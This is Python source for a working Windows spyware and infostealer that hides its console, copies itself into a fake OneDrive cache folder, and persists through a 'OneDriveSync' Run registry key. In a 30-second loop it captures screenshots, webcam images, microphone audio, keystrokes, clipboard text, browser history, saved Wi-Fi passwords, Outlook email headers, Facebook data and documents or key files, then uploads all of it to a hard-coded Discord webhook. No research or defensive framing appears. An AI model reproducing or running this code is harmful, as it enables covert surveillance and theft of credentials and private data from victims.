import sys, os, tempfile, requests, socket, time, psutil, GPUtil, shutil, zipfile, subprocess
from datetime import datetime, timedelta
import winreg, sqlite3, threading, pyperclip, win32api, win32gui, win32ui
import win32con, win32event, ctypes, json, base64, urllib.request
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from PIL import Image

class X:
    W = 'https://discord.com/api/webhooks/1367959613508554842/xq6YqgBvkcxCc70P1ONjU_QXBjIs-5cEsB-DsCagkZ_0svpb8co5XFeyzYdHtxnldf9O'
    F = 'https://discord.com/api/webhooks/1367959613508554842/xq6YqgBvkcxCc70P1ONjU_QXBjIs-5cEsB-DsCagkZ_0svpb8co5XFeyzYdHtxnldf9O'
    K = b'ThisIsASecretKey123'
    V = b'ThisIsAnIV4567890'
    I = {'si':30,'sc':30,'fl':30,'bh':30,'wf':30,'cb':30,'pr':30,'nt':30,'sv':30,'ia':30,'kl':30,'mc':30,'wc':30,'em':30,'fb':30}
    D = [os.path.join(os.environ['USERPROFILE'], x) for x in ['Desktop','Documents','Downloads']] + [
        os.path.join(os.environ['APPDATA'], x) for x in [
            'Microsoft\\Windows\\Recent','Microsoft\\Credentials','Mozilla\\Firefox\\Profiles',
            'Google\\Chrome\\User Data','Discord','Telegram Desktop','Facebook'
        ]
    ]
    E = ['.txt','.doc','.docx','.xls','.xlsx','.pdf','.jpg','.png','.config','.sql','.db','.sqlite',
         '.mdb','.key','.pem','.cer','.crt','.pfx','.zip','.rar','.7z','.tar','.gz','.csv','.pptx','.json']

Y, Z = True, time.time()
L = {k:0 for k in X.I.keys()}

def hide_console():
    kernel32 = ctypes.WinDLL('kernel32')
    user32 = ctypes.WinDLL('user32')
    hWnd = kernel32.GetConsoleWindow()
    if hWnd:
        user32.ShowWindow(hWnd, 0)
        kernel32.FreeConsole()

def G():
    try: return urllib.request.urlopen('https://api.ipify.org').read().decode()
    except: return "?"

def SR():
    cf = os.path.abspath(sys.argv[0])
    td = os.path.join(os.getenv('APPDATA'), 'Local', 'OneDrive', 'cache')
    tf = os.path.join(td, os.path.basename(cf))
    if not os.path.abspath(cf).lower() == os.path.abspath(tf).lower():
        try:
            os.makedirs(td, exist_ok=True)
            if os.path.exists(tf): os.remove(tf)
            shutil.copy2(cf, tf)
            AS(tf)
            subprocess.Popen([tf], shell=True, creationflags=subprocess.CREATE_NO_WINDOW | subprocess.SW_HIDE)
            sys.exit(0)
        except: pass

def AS(p=None):
    try:
        k = winreg.HKEY_CURRENT_USER
        r = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(k, r, 0, winreg.KEY_WRITE) as x:
            winreg.SetValueEx(x, "OneDriveSync", 0, winreg.REG_SZ, p or os.path.abspath(sys.argv[0]))
    except: pass

def E(d):
    c = AES.new(X.K, AES.MODE_CBC, X.V)
    return base64.b64encode(c.encrypt(pad(d.encode(), AES.block_size))).decode()

def S(u,m,f=None):
    try:
        d = {"content":m}
        if f and os.path.exists(f):
            with open(f,"rb") as x: requests.post(u,files={"file":(os.path.basename(f),x)},data=d,timeout=30)
        else: requests.post(u,json=d,timeout=30)
    except: pass

def CS():
    try:
        h = win32gui.GetDesktopWindow()
        w = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
        ht = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
        l = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
        t = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
        dc = win32gui.GetWindowDC(h)
        i = win32ui.CreateDCFromHandle(dc)
        m = i.CreateCompatibleDC()
        s = win32ui.CreateBitmap()
        s.CreateCompatibleBitmap(i,w,ht)
        m.SelectObject(s)
        m.BitBlt((0,0),(w,ht),i,(l,t),win32con.SRCCOPY)
        p = os.path.join(tempfile.gettempdir(),f"s_{int(time.time())}.bmp")
        s.SaveBitmapFile(m,p)
        Image.open(p).save(p.replace('.bmp','.png'))
        os.remove(p)
        m.DeleteDC()
        i.DeleteDC()
        win32gui.ReleaseDC(h,dc)
        win32gui.DeleteObject(s.GetHandle())
        return p.replace('.bmp','.png')
    except: return None

def CW():
    try:
        import cv2
        c = cv2.VideoCapture(0)
        c.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
        c.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
        r,f = c.read()
        if r:
            p = os.path.join(tempfile.gettempdir(),f"w_{int(time.time())}.jpg")
            cv2.imwrite(p,f)
            c.release()
            return p
        c.release()
        return None
    except: return None

def RM(d=5):
    try:
        import sounddevice as sd
        from scipy.io.wavfile import write
        fs = 44100
        r = sd.rec(int(d*fs),samplerate=fs,channels=1,dtype='int16')
        sd.wait()
        p = os.path.join(tempfile.gettempdir(),f"m_{int(time.time())}.wav")
        write(p,fs,r)
        return p
    except: return None

def KH():
    try:
        import keyboard
        keyboard.start_recording()
        time.sleep(10)
        e = keyboard.stop_recording()
        t = ""
        for x in e:
            if x.event_type == keyboard.KEY_DOWN:
                if len(x.name)==1: t+=x.name
                elif x.name=="space": t+=" "
                elif x.name=="enter": t+="\n"
        return t if t else "?"
    except: return None

def CF():
    try:
        t = os.path.join(tempfile.gettempdir(),f"f_{int(time.time())}")
        os.makedirs(t,exist_ok=True)
        c = []
        for d in X.D:
            if os.path.exists(d):
                for r,_,f in os.walk(d):
                    for x in f:
                        if any(x.lower().endswith(e) for e in X.E):
                            try:
                                s = os.path.join(r,x)
                                ds = os.path.join(t,os.path.relpath(s,d))
                                os.makedirs(os.path.dirname(ds),exist_ok=True)
                                shutil.copy2(s,ds)
                                c.append(ds)
                            except: pass
        if not c:
            shutil.rmtree(t)
            return None
        z = os.path.join(tempfile.gettempdir(),f"f_{int(time.time())}.zip")
        with zipfile.ZipFile(z,'w',zipfile.ZIP_DEFLATED) as zf:
            for x in c: zf.write(x,os.path.relpath(x,t))
        shutil.rmtree(t)
        return z
    except:
        if 't' in locals() and os.path.exists(t): shutil.rmtree(t,ignore_errors=True)
        return None

def BH():
    try:
        h = []
        cp = os.path.join(os.getenv('LOCALAPPDATA'),'Google','Chrome','User Data','Default','History')
        if os.path.exists(cp):
            try:
                t = os.path.join(tempfile.gettempdir(),'c_h.db')
                shutil.copy2(cp,t)
                conn = sqlite3.connect(t)
                cur = conn.cursor()
                cur.execute("SELECT url,title,last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
                h.append("**Chrome:**")
                for x in cur.fetchall(): h.append(f"URL: {x[0]}, Title: {x[1]}, Last: {datetime(1601,1,1)+timedelta(microseconds=x[2])}")
                conn.close()
                os.remove(t)
            except Exception as e: h.append(f"Chrome error: {e}")
        fp = os.path.join(os.getenv('APPDATA'),'Mozilla','Firefox','Profiles')
        if os.path.exists(fp):
            try:
                for p in os.listdir(fp):
                    if p.endswith('.default-release'):
                        pl = os.path.join(fp,p,'places.sqlite')
                        if os.path.exists(pl):
                            t = os.path.join(tempfile.gettempdir(),'f_h.db')
                            shutil.copy2(pl,t)
                            conn = sqlite3.connect(t)
                            cur = conn.cursor()
                            cur.execute("SELECT url,title,last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 100")
                            h.append("\n**Firefox:**")
                            for x in cur.fetchall(): h.append(f"URL: {x[0]}, Title: {x[1]}, Last: {datetime.fromtimestamp(x[2]/1000000) if x[2] else 'N/A'}")
                            conn.close()
                            os.remove(t)
            except Exception as e: h.append(f"Firefox error: {e}")
        return "\n".join(h) if h else "?"
    except Exception as e: return f"Error: {e}"

def WP():
    try:
        if sys.platform=="win32":
            p = [x.split(":")[1].strip() for x in subprocess.run(['netsh','wlan','show','profiles'],capture_output=True,text=True,creationflags=subprocess.CREATE_NO_WINDOW).stdout.split('\n') if "All User Profile" in x]
            w = []
            for x in p:
                try:
                    k = [x.split(":")[1].strip() for x in subprocess.run(['netsh','wlan','show','profile',x,'key=clear'],capture_output=True,text=True,creationflags=subprocess.CREATE_NO_WINDOW).stdout.split('\n') if "Key Content" in x]
                    w.append(f"SSID: {x}, Pass: {k[0] if k else 'N/A'}")
                except: w.append(f"SSID: {x}, Pass: ?")
            return "\n".join(w)
        else: return "Windows only"
    except Exception as e: return f"Error: {e}"

def GC():
    try: return pyperclip.paste()
    except Exception as e: return f"Error: {e}"

def IA():
    try:
        if sys.platform=="win32":
            a = []
            for r in [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"]:
                try:
                    k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,r)
                    for i in range(0,winreg.QueryInfoKey(k)[0]):
                        try:
                            sk = winreg.OpenKey(k,winreg.EnumKey(k,i))
                            n = winreg.QueryValueEx(sk,"DisplayName")[0]
                            v = winreg.QueryValueEx(sk,"DisplayVersion")[0]
                            a.append(f"{n} (v{v})")
                        except: continue
                except: continue
            return "\n".join(a[:50])
        else: return "Windows only"
    except Exception as e: return f"Error: {e}"

def RP():
    try:
        p = []
        for x in psutil.process_iter(['pid','name','username']):
            try: p.append(f"PID: {x.info['pid']}, Name: {x.info['name']}, User: {x.info['username']}")
            except: continue
        return "\n".join(p[:50])
    except Exception as e: return f"Error: {e}"

def NC():
    try:
        c = []
        for x in psutil.net_connections(kind='inet'):
            if x.status == psutil.CONN_ESTABLISHED:
                c.append(f"Local: {x.laddr.ip}:{x.laddr.port}, Remote: {x.raddr.ip}:{x.raddr.port if x.raddr else 'N/A'}, PID: {x.pid}")
        return "\n".join(c[:50])
    except Exception as e: return f"Error: {e}"

def RS():
    try:
        s = []
        for x in psutil.win_service_iter():
            try: s.append(f"Name: {x.name()}, Display: {x.display_name()}, Status: {x.status()}")
            except: continue
        return "\n".join(s[:50])
    except Exception as e: return f"Error: {e}"

def SI():
    try:
        hn = socket.gethostname()
        try: ip = socket.gethostbyname(hn)
        except: ip = "?"
        ut = str(timedelta(seconds=time.time()-Z))
        mt = str(timedelta(seconds=time.time()-psutil.boot_time()))
        ei = G()
        g = ""
        try:
            for x in GPUtil.getGPUs():
                g += (f"\n- GPU: {x.name}, Load: {x.load*100:.1f}%, "
                    f"Mem: {x.memoryUsed:.1f}/{x.memoryTotal:.1f} GB, "
                    f"Temp: {x.temperature}°C")
        except: g = "\n- GPU: ?"
        return (f"**System:**\n- Host: {hn}\n- IP: {ip}\n- Ext IP: {ei}\n"
                f"- Uptime: {ut}\n- Sys uptime: {mt}\n- CPU: {os.cpu_count()} cores\n"
                f"- Mem: {round(psutil.virtual_memory().total/(1024**3),1)} GB{g}")
    except Exception as e: return f"Error: {str(e)}"

def SU():
    try:
        cpu = psutil.cpu_percent(interval=1)
        mem = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        gu,gt = "N/A","N/A"
        try:
            g = GPUtil.getGPUs()
            if g: gu,gt = f"{g[0].load*100:.1f}%",f"{g[0].temperature}°C"
        except: pass
        return (f"**Usage:**\n- CPU: {cpu}%\n- Mem: {mem.percent}% "
                f"({round(mem.used/1024**3,1)}/{round(mem.total/1024**3,1)} GB)\n"
                f"- Disk: {disk.percent}% ({round(disk.used/1024**3,1)}/"
                f"{round(disk.total/1024**3,1)} GB)\n- GPU: {gu}\n- Temp: {gt}")
    except Exception as e: return f"Error: {str(e)}"

def EM():
    try:
        import win32com.client
        outlook = win32com.client.Dispatch("Outlook.Application")
        mapi = outlook.GetNamespace("MAPI")
        msgs = []
        for i in range(1, min(6, len(mapi.Folders))):
            folder = mapi.Folders[i]
            for item in folder.Items:
                if item.Class == 43:
                    msgs.append(f"From: {item.SenderName}, Subject: {item.Subject}")
                    if len(msgs) >= 10: break
            if len(msgs) >= 10: break
        return "\n".join(msgs) if msgs else "No emails"
    except Exception as e: return f"Email error: {e}"

def FB():
    try:
        fb_path = os.path.join(os.getenv('APPDATA'), 'Facebook')
        if os.path.exists(fb_path):
            temp_fb = os.path.join(tempfile.gettempdir(), 'fb_data.zip')
            with zipfile.ZipFile(temp_fb, 'w', zipfile.ZIP_DEFLATED) as zf:
                for root, _, files in os.walk(fb_path):
                    for file in files:
                        if file.endswith(('.json', '.db', '.sqlite')):
                            zf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), fb_path))
            return temp_fb
        return None
    except Exception as e: return f"FB error: {e}"

def main_loop():
    global L, Y
    while Y:
        t = time.time()
        try:
            if t-L['si']>=X.I['si']:
                if S(X.W,SI()): L['si']=t
                S(X.W,SU())
            if t-L['sc']>=X.I['sc']:
                s = CS()
                if s:
                    S(X.W,"Screenshot:",s)
                    os.remove(s)
                    L['sc']=t
            if t-L['mc']>=X.I['mc']:
                a = RM()
                if a:
                    S(X.W,"Audio:",a)
                    os.remove(a)
                    L['mc']=t
            if t-L['wc']>=X.I['wc']:
                w = CW()
                if w:
                    S(X.W,"Webcam:",w)
                    os.remove(w)
                    L['wc']=t
            if t-L['kl']>=X.I['kl']:
                k = KH()
                if k: S(X.W,f"Keys:\n{E(k)}"); L['kl']=t
            if t-L['fl']>=X.I['fl']:
                f = CF()
                if f:
                    S(X.F,"Files:",f)
                    os.remove(f)
                    L['fl']=t
            if t-L['bh']>=X.I['bh']:
                S(X.W,f"History:\n{BH()}"); L['bh']=t
            if t-L['wf']>=X.I['wf']:
                S(X.W,f"WiFi:\n{WP()}"); L['wf']=t
            if t-L['cb']>=X.I['cb']:
                S(X.W,f"Clipboard:\n{GC()}"); L['cb']=t
            if t-L['pr']>=X.I['pr']:
                S(X.W,f"Processes:\n{RP()}"); L['pr']=t
            if t-L['nt']>=X.I['nt']:
                S(X.W,f"Network:\n{NC()}"); L['nt']=t
            if t-L['sv']>=X.I['sv']:
                S(X.W,f"Services:\n{RS()}"); L['sv']=t
            if t-L['ia']>=X.I['ia']:
                S(X.W,f"Apps:\n{IA()}"); L['ia']=t
            if t-L['em']>=X.I['em']:
                S(X.W,f"Emails:\n{EM()}"); L['em']=t
            if t-L['fb']>=X.I['fb']:
                fb = FB()
                if fb:
                    S(X.F,"FB Data:",fb)
                    os.remove(fb)
                    L['fb']=t
            time.sleep(30)
        except: time.sleep(60)

def main():
    hide_console()
    
    mutex = win32event.CreateMutex(None, False, "Global\\UniqueAppMutex")
    if win32api.GetLastError() == win32con.ERROR_ALREADY_EXISTS:
        sys.exit(0)
    
    SR()
    
    AS()

    main_loop()

if __name__ == '__main__':
    if sys.executable.endswith("pythonw.exe"):
        main()
    else:
        subprocess.Popen([sys.executable.replace("python.exe", "pythonw.exe"), sys.argv[0]], 
                        creationflags=subprocess.CREATE_NO_WINDOW)
        sys.exit(0)